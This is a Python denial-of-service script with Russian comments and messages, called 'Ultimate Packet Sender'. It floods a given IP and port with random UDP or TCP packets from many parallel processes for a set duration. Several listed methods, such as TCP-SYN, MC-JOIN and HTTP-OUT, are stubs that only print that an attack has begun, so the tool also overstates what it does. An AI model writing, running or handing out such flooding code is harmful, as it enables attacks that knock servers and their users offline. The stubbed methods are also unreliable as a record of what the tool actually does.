import socket
import random
import threading
import multiprocessing
import sys
import time
import colorama
from colorama import Fore, Style
import itertools
import signal

colorama.init(autoreset=True)

def animate(stop_event, target_ip, target_port, protocol, duration, workers):
    """Анимация загрузки с выводом информации об атаке."""
    time.sleep(5)  # Задержка перед началом анимации
    while not stop_event.is_set():
        sys.stdout.write(f"\r{Fore.CYAN}🚀 Атака выполняется на {Fore.YELLOW}{target_ip}:{target_port}{Fore.CYAN} | {protocol} | {duration}s | Мощность: {workers} потоков {random.choice(['🔥', '💥', '⚡', '🚀'])} {Style.RESET_ALL}")
        sys.stdout.flush()
        time.sleep(0.5)

def send_udp_packets(target_ip, target_port, packet_size=1024, duration=10):
    """Функция для отправки множества UDP-пакетов."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(packet_size)
    
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            sock.sendto(packet, (target_ip, target_port))
        except Exception as e:
            print(f"{Fore.RED}❌ Ошибка UDP: {e}{Style.RESET_ALL}")
            break
    
    sock.close()

def send_tcp_packets(target_ip, target_port, packet_size=1024, duration=10):
    """Функция для отправки множества TCP-пакетов."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))
        packet = random._urandom(packet_size)
        
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                sock.send(packet)
            except Exception as e:
                print(f"{Fore.RED}❌ Ошибка TCP: {e}{Style.RESET_ALL}")
                break
    except Exception as e:
        print(f"{Fore.RED}❌ Ошибка при подключении: {e}{Style.RESET_ALL}")
    finally:
        sock.close()

# Протоколы Layer 4
def tcp_syn_flood(target_ip, target_port, duration):
    print(f"{Fore.YELLOW}🚨 Запущена атака TCP-SYN на {target_ip}:{target_port} {duration}s{Style.RESET_ALL}")

def tcp_ack_flood(target_ip, target_port, duration):
    print(f"{Fore.YELLOW}🚨 Запущена атака TCP-ACK на {target_ip}:{target_port} {duration}s{Style.RESET_ALL}")

def udp_pps_flood(target_ip, target_port, duration):
    print(f"{Fore.YELLOW}🚨 Запущена атака UDP-PPS на {target_ip}:{target_port} {duration}s{Style.RESET_ALL}")

def udp_china_flood(target_ip, target_port, duration):
    print(f"{Fore.YELLOW}🚨 Запущена атака UDP-CHINA на {target_ip}:{target_port} {duration}s{Style.RESET_ALL}")

# Протоколы Layer 7
def mc_cps_flood(target_ip, target_port, duration):
    print(f"{Fore.YELLOW}🚨 Запущена атака MC-CPS на {target_ip}:{target_port} {duration}s{Style.RESET_ALL}")

def mc_join_flood(target_ip, target_port, duration):
    print(f"{Fore.YELLOW}🚨 Запущена атака MC-JOIN на {target_ip}:{target_port} {duration}s{Style.RESET_ALL}")

def mc_ping_flood(target_ip, target_port, duration):
    print(f"{Fore.YELLOW}🚨 Запущена атака MC-PING на {target_ip}:{target_port} {duration}s{Style.RESET_ALL}")

def mc_handshake_flood(target_ip, target_port, duration):
    print(f"{Fore.YELLOW}🚨 Запущена атака MC-HANDSHAKE на {target_ip}:{target_port} {duration}s{Style.RESET_ALL}")

def mc_tcpbypass_flood(target_ip, target_port, duration):
    print(f"{Fore.YELLOW}🚨 Запущена атака MC-TCPBYPASS на {target_ip}:{target_port} {duration}s{Style.RESET_ALL}")

# Протоколы Web (HTTP Layer 7)
def http_out_flood(target_ip, target_port, duration):
    print(f"{Fore.YELLOW}🚨 Запущена атака HTTP-OUT на {target_ip}:{target_port} {duration}s{Style.RESET_ALL}")

def http_misc_flood(target_ip, target_port, duration):
    print(f"{Fore.YELLOW}🚨 Запущена атака HTTP-MISC на {target_ip}:{target_port} {duration}s{Style.RESET_ALL}")

def run_all_protocols(target_ip, target_port, duration, workers):
    """Метод ALL - запускает все протоколы по очереди."""
    protocols = [
        ('TCP-SYN', tcp_syn_flood),
        ('TCP-ACK', tcp_ack_flood),
        ('UDP-PPS', udp_pps_flood),
        ('UDPCHINA', udp_china_flood),
        ('MC-CPS', mc_cps_flood),
        ('MC-JOIN', mc_join_flood),
        ('MC-PING', mc_ping_flood),
        ('MC-HANDSHAKE', mc_handshake_flood),
        ('MC-TCPBYPASS', mc_tcpbypass_flood),
        ('HTTP-OUT', http_out_flood),
        ('HTTP-MISC', http_misc_flood)
    ]

    for protocol_name, protocol_func in protocols:
        print(f"\n{Fore.GREEN}Запуск атаки {protocol_name}...{Style.RESET_ALL}")
        protocol_func(target_ip, target_port, duration)
        time.sleep(2)  # Пауза между атаками

def run_attack(target_ip, target_port, protocol, duration, workers):
    """Функция для запуска многопоточной и многопроцессорной атаки."""
    process_list = []
    stop_event = threading.Event()
    anim_thread = threading.Thread(target=animate, args=(stop_event, target_ip, target_port, protocol, duration, workers), daemon=True)
    anim_thread.start()
    
    if protocol == "ALL":
        run_all_protocols(target_ip, target_port, duration, workers)
        return
    
    for _ in range(workers):
        if protocol == "UDP":
            process = multiprocessing.Process(target=send_udp_packets, args=(target_ip, target_port, 1024, duration))
        elif protocol == "TCP":
            process = multiprocessing.Process(target=send_tcp_packets, args=(target_ip, target_port, 1024, duration))
        else:
            print(f"{Fore.RED}🚨 Ошибка: поддерживаемые протоколы - TCP, UDP, ALL{Style.RESET_ALL}")
            return
        
        process.start()
        process_list.append(process)
    
    for process in process_list:
        process.join()
    
    stop_event.set()
    sys.stdout.write("\r")
    sys.stdout.flush()

def banner():
    """Вывод баннера"""
    print(f"{Fore.MAGENTA}==================================")
    print(f"🚀 {Fore.YELLOW}💣 Ultimate Packet Sender 💣 {Fore.MAGENTA}🚀")
    print(f"================================== {Style.RESET_ALL}")

def signal_handler(sig, frame):
    print(f"\n{Fore.RED}❌ Атака прервана пользователем.{Style.RESET_ALL}")
    sys.exit(0)

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    banner()
    
    if len(sys.argv) != 4:
        print(f"{Fore.RED}⚠️ Использование: python z.py ip:port protocol time{Style.RESET_ALL}")
        sys.exit(1)
    
    target = sys.argv[1]
    protocol = sys.argv[2].upper()
    duration = int(sys.argv[3])
    workers = multiprocessing.cpu_count() * 2  # Использует в 2 раза больше потоков, чем ядер
    
    try:
        target_ip, target_port = target.split(":")
        target_port = int(target_port)
    except ValueError:
        print(f"{Fore.RED}🚨 Ошибка: неправильный формат ip:port{Style.RESET_ALL}")
        sys.exit(1)
    
    print(f"{Fore.GREEN}💥 Атака началась на {target_ip}:{target_port} через {protocol} на {duration} секунд! 🔥{Style.RESET_ALL}")
    run_attack(target_ip, target_port, protocol, duration, workers)
    print(f"{Fore.BLUE}✅ 🎯 Отправка пакетов завершена!{Style.RESET_ALL}")
